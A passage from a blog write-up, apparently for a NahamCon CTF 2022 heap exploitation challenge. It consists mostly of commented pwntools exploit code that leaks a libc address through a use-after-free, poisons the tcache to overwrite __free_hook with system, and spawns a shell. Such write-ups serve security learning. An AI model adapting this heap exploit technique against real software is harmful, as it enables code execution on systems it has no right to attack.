</span></span><span class="line"><span class="cl"><span class="c1"># and use this heap chunk for property variable</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter your name: &#39;</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">Part 1: Leak Libc base address
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Create big chunk for Comment</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Chunk-1: Street name</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Chunk-2: Comment</span>
</span></span><span class="line"><span class="cl"><span class="n">add_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;lmao&#39;</span><span class="p">,</span> <span class="mh">0x427</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;lmao&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Prevent consolidate</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Chunk-1 got freed -&gt; tcache</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Chunk-3: Street name</span>
</span></span><span class="line"><span class="cl"><span class="n">edit_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;lmao&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Free all</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Chunk-2 got freed -&gt; unsorted_bin due to its large size</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Chunk-3 got freed -&gt; Tcache</span>
</span></span><span class="line"><span class="cl"><span class="n">remove_property</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Due to bug on remove_property, even though we create a new property without comment,</span>
</span></span><span class="line"><span class="cl"><span class="c1"># the property&#39;s comment still point to the freed chunk, hence we can leak libc address</span>
</span></span><span class="line"><span class="cl"><span class="c1"># via show_property due to the fact that unsorted_bin point to libc main_arena + 0x60.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Create new property without comment &amp; show its property</span>
</span></span><span class="line"><span class="cl"><span class="n">add_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;lmao&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">leaked_libc</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show_property</span><span class="p">(</span><span class="n">r</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;leaked_libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_libc</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">leaked_libc</span> <span class="o">-</span> <span class="n">main_arena</span> <span class="o">-</span> <span class="mh">0x60</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;libc_base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
</span></span><span class="line"><span class="cl"><span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;__free_hook@libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">free_hook</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;system@libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">Part 2: Overwrite __free_hook with system
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Final target will be to:</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - Tcache poisoning to overwrite the freed chunk pointer with __free_hook</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># We want to clean it up. To be able to call remove_property, we need to malloc(0x427+1)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># to fill up the freed chunk of comment, so that we won&#39;t double free comment chunk.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># The trick is we can leverage change_username feature to do this</span>
</span></span><span class="line"><span class="cl"><span class="n">change_username</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mh">0x427</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;lmao&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">remove_property</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Notice that now, username and comment still points to the same pointer</span>
</span></span><span class="line"><span class="cl"><span class="c1"># To make it points to different pointer, we simply create new property</span>
</span></span><span class="line"><span class="cl"><span class="c1"># and remove it.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Notes:</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - The street chunk will use the unsorted bin cache by reducing its size</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   because we don&#39;t have any tcache yet with size 0xa1.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - The comment chunk will use the tcache[0x30]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Also notes that:</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - The stored size of username is 0x427+1</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - The username is still pointing to the unsorted bin chunk</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - Now, everytime we try to alloc a chunk size that is &lt; unsorted bin chunk size</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   it will use the unsorted bin chunk by reducing its chunk size per alloc</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - And because the code is allowing us to change the username value without free &amp; malloc</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   if the size is &lt; stored size (0x427+1), basically after this moment, we can rewrite</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   new chunks those use the unsorted bin chunks via change username :)</span>
</span></span><span class="line"><span class="cl"><span class="n">add_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;lmao&#39;</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;lmao&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">remove_property</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Now username and comment isn&#39;t pointing to the same chunk</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Notice that due to the freed comment chunk is not nulled by remove_property,</span>
</span></span><span class="line"><span class="cl"><span class="c1"># not only we can leak the freed chunk content, we can also overwrite it via</span>
</span></span><span class="line"><span class="cl"><span class="c1"># edit_property.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Notice that the freed order in remove_property are:</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - Comment</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - Street (and nulled it)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - Property (and nulled itself)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># However, because we can only manipulate the freed comment chunk, we need to place the</span>
</span></span><span class="line"><span class="cl"><span class="c1"># freed comment chunk as the second entry of the tcache bins.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># How to achieve that? We can use the edit_property</span>
</span></span><span class="line"><span class="cl"><span class="c1"># We plan to manipulate tcache[0x60], so we set the chunk size to 0x49+1</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Create two 0x60 chunks (street and comment)</span>
</span></span><span class="line"><span class="cl"><span class="n">add_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;lmao&#39;</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;lmao&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Edit the street name to higher chunk size.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Now, tcache[0x60][0] = address of old street chunk</span>
</span></span><span class="line"><span class="cl"><span class="n">edit_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;lmao&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Now, call remove_property. It will freed comment, street, and property itself</span>
</span></span><span class="line"><span class="cl"><span class="c1"># State after remove:</span>
</span></span><span class="line"><span class="cl"><span class="c1"># tcache_bins[0x60] = old street chunk &lt;- comment chunk</span>
</span></span><span class="line"><span class="cl"><span class="n">remove_property</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Create new property without comment. We&#39;re going to overwrite the freed comment chunk</span>
</span></span><span class="line"><span class="cl"><span class="n">add_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;lmao&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Edit it to free_hook address</span>
</span></span><span class="line"><span class="cl"><span class="c1"># After state:</span>
</span></span><span class="line"><span class="cl"><span class="c1"># tcache_bins[0x60] = __free_hook &lt;- comment chunk</span>
</span></span><span class="line"><span class="cl"><span class="n">edit_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;lmao&#39;</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">),</span> <span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Make malloc(0x49+1) to use the tcache_bins[0x60]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># After state:</span>
</span></span><span class="line"><span class="cl"><span class="c1"># tcache_bins[0x60] = __free_hook</span>
</span></span><span class="line"><span class="cl"><span class="c1"># street and comment pointing to the same chunk due to this</span>
</span></span><span class="line"><span class="cl"><span class="n">edit_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x8</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Tricky part is here. Remember that:</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - username&#39;s stored size is 0x478</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - username chunk address is lower than the current property chunk</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - So far, based on GDB, we have used the unsorted bin chunk</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   about 0x01+0x60+0x60+0x70</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - We want to modify the chunk size of the street, which is</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   the second 0x60 chunk starting from the address that username points</span>
</span></span><span class="line"><span class="cl"><span class="n">change_username</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">500</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">31</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x51</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Change the street stored size to smaller size first</span>
</span></span><span class="line"><span class="cl"><span class="n">edit_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x8</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Because we alloc larger size than 0x20, edit_property will free &amp; alloc.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># And because we forge the chunk size to 0x51, now this edit will:</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - Free 0x50 chunk</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - Malloc(0x49+1) to use the tcache_bins[0x60]. Because bins is pointing to</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   __free_hook, the street name is now pointing to it</span>
</span></span><span class="line"><span class="cl"><span class="n">edit_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Set the comment value to /bin/sh</span>
</span></span><span class="line"><span class="cl"><span class="n">edit_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">),</span> <span class="mi">13</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Free the comment, and we will call</span>
</span></span><span class="line"><span class="cl"><span class="c1"># system(&#39;/bin/sh\x00&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">),</span> <span class="mh">0x90</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="kc">True</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="social-media">Social Media</h2>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>
                    
                </span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/nahamcon-ctf-2022/" data-title="NahamCon CTF 2022" data-via="Chovid99" data-hashtags="Writeup,NahamConCTF,heap,pwn,2022"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/nahamcon-ctf-2022/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/nahamconctf/">NahamConCTF</a>,&nbsp;<a href="/tags/heap/">heap</a>,&nbsp;<a href="/tags/pwn/">pwn</a>,&nbsp;<a href="/tags/2022/">2022</a></section>
        <section>
            
        </section>
    </div>

    <div class="post-nav"><a href="/posts/zer0pts-ctf-2022/" class="prev" rel="prev" title="zer0pts CTF 2022"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>zer0pts CTF 2022</a>
            <a href="/posts/angstrom-ctf-2022/" class="next" rel="next" title="Angstrom CTF 2022">Angstrom CTF 2022<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/Chovid99" target="_blank">Chovid99</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
            gtag('config', 'G-19HP521HQ9', { 'anonymize_ip': true });
        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9" async></script></body>
</html>
